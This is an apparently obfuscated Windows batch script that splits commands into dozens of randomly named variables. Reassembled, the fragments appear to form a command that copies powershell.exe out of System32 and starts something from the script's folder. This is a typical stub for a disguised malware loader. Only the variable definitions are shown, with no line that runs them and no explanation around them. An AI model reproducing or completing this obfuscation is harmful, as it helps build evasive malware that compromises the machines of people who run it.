@echo off
set "fwxqwnMZxB=rS"
set "WhMQtPAipp=we"
set "RfIrWuZmdV=.e"
set "mQQqyorVnh=ll"
set "EzLUXjoHpa=in"
set "fDkYwMPvzy=em"
set "xmQtNKkuLg=rs"
set "FUCtKtWpXF=he"
set "jrBBbbFsgZ=1."
set "MpAFleBMCg=co"
set "PxtuFYdzLd=s\"
set "uPBcYtLLVR=he"
set "idbgJJCRLa=py"
set "VveOQURrwG=\v"
set "ucUbQkPbRb=32"
set "HPGQGjPOCP=po"
set "tJZQUAwANG=\W"
set "TllJcKAcQu=0\"
set "ZucwvLdQrc=xe"
set "qpHSTVqZdG=Po"
set "fnNVAGufYX= C"
set "krNMwwEueW=ws"
set "BETqwVTuty=we"
set "sphEophkfD=y "
set "GoaTHZtENQ=st"
set "JvOFztrpLA=ow"
set "kiPexyCFeE=nd"
set "uhjnkwSWzm=Wi"
set "khzCmGwzUy= /"
set "NyGMNyZHpV=Sy"
set "IEiQAEuZcw=do"
set "nvWvAcFWtH=ll"
set "HOMMujUfyq=:\"
set "PPBkjfwJzX=cd"
set "UkrLYqPCxD= %~dp0"
set "tlDxGlleZV=$LyO"
set "AUspCptmFd=Star"
